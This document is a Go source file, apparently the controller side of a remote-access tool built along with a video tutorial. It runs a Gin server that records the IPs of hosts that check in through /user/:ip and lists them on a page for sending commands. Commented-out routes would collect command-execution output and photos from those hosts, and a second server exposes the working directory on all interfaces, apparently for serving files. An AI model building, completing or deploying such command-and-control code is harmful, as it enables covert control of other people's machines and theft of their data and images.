package main

import (
	"encoding/csv"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"sync"
)


const ginServerAddr = "0.0.0.0:80"

// 定义一个全局的map用于存储已写入的IP地址
var writtenIPs = make(map[string]bool)


type Item struct {
	ID   int
	Name string   // actually is IP
}

// 通信功能
func startGinServer(wg *sync.WaitGroup) {
	defer wg.Done()

	// create gin engine
	r := gin.Default()
	r.LoadHTMLGlob("server/templates/*")

	// add gin router
	// === non ui operation ===
	// server side received request

	// record connection ip
	r.GET("/user/:ip", RecordIP)
	// get exec cmd result
	//r.GET("/cmd/:result", GetGmdResult)  # temp comment
	// get picture result
	//r.POST("/photo", GetPhotoResult)     # temp comment

	// homepage
	r.GET("/index", Index)    // 0:30:17
	r.GET("/edit/:id", Edit)  // 0:32:04


	// launch Gin server
	fmt.Printf("Gin server is listening on hhttp://%s\n", ginServerAddr)

	err := r.Run(ginServerAddr)
	if err != nil {
		fmt.Println("Error starting Gin server: ", err)
	}

}

// send command
func Edit(c *gin.Context) {
	ip := c.Param("id")
	c.HTML(200,"edit.html", gin.H{
		"ip":ip,
	})
}

func RecordIP(c *gin.Context) {

	// router "/user/:ip"
	ip := c.Param("ip")

	// check if write same ip or not
	if writtenIPs[ip] {
		fmt.Printf("IP %s already in csv file, no need to write again.\n", ip)
		return
	}

	// open csv file
	file, err := os.Open("info.csv")
	if err != nil {
		fmt.Println("write ip in info.csv error: ", err)
		return
	}
	defer file.Close()

	// read csv file
	reader := csv.NewReader(file)
	records, err := reader.ReadAll()

	if err != nil {
		fmt.Println("Write file error: ", err)
	}

	// check if ip in csv or not
	for _, record := range records {
		if len(record) > 0 && record[0] == ip {
			fmt.Printf("IP %s already in csv file, no need to write again.\n", ip)
			return
		}
	}

	// if ip not in, add it to csv
	file, err = os.OpenFile("info.csv", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		fmt.Println("write ip in info.csv error: ", err)
		return
	}
	defer file.Close()

	writer := csv.NewWriter(file)
	defer writer.Flush()

	// write ip address in csv
	err = writer.Write([]string{ip})
	if err != nil {
		fmt.Println("write ip in info.csv error: ", err)
		return
	}

	// record already write in csv ip to var writtenIPs
	writtenIPs[ip] = true
	fmt.Printf("IP %s write in csv success.\n", ip)

}

func Index(c *gin.Context) {
	items, err := GetIP()

	if err != nil {
		fmt.Println("Error in Index: ", err)
	}

	c.HTML(http.StatusOK, "index.html", gin.H{
		"Items": items,
	})

}

func GetIP() ([]Item, error) {
	// open csv file
	file, err := os.Open("info.csv")
	if err != nil {
		fmt.Println("Error GetIP() ", err)
	}
	defer file.Close()

	// read csv content
	reader := csv.NewReader(file)
	records, err := reader.ReadAll()

	if err != nil {
		fmt.Println("Error GetIP() ReadAll ", err)
	}

	// parse csv, create item list
	var items []Item
	for i, record := range records {
		// in csv, each line just has one ip
		item := Item{
			ID:   i + 1, // generate virtual_id for each ip
			Name: record[0],
		}
		items = append(items, item)
	}
	return items, nil
}

// ftp file storage
func startFileServer(wg *sync.WaitGroup) {
	defer wg.Done()

	// setting file server  15:04
	fs := http.FileServer(http.Dir("."))

	// register file server handler
	http.Handle("/", http.StripPrefix("/", fs))

	// launch file server
	//fileServerAddr := "127.0.0.1:8000"
	fileServerAddr := "0.0.0.0:8000"

	fmt.Printf("File server is listening on http://%s\n", fileServerAddr)

	err := http.ListenAndServe(fileServerAddr, nil)
	if err != nil {
		fmt.Println("Error starting file server: ", err)
	}
}



func main() {
	var wg sync.WaitGroup // threading sync

	// need open 2 port at the same time, can use sync

	// launch file server
	wg.Add(1)
	go startFileServer(&wg)

	// launch Gin Server
	wg.Add(1)
	go startGinServer(&wg)

	// wait 2 server exit
	wg.Wait()
}
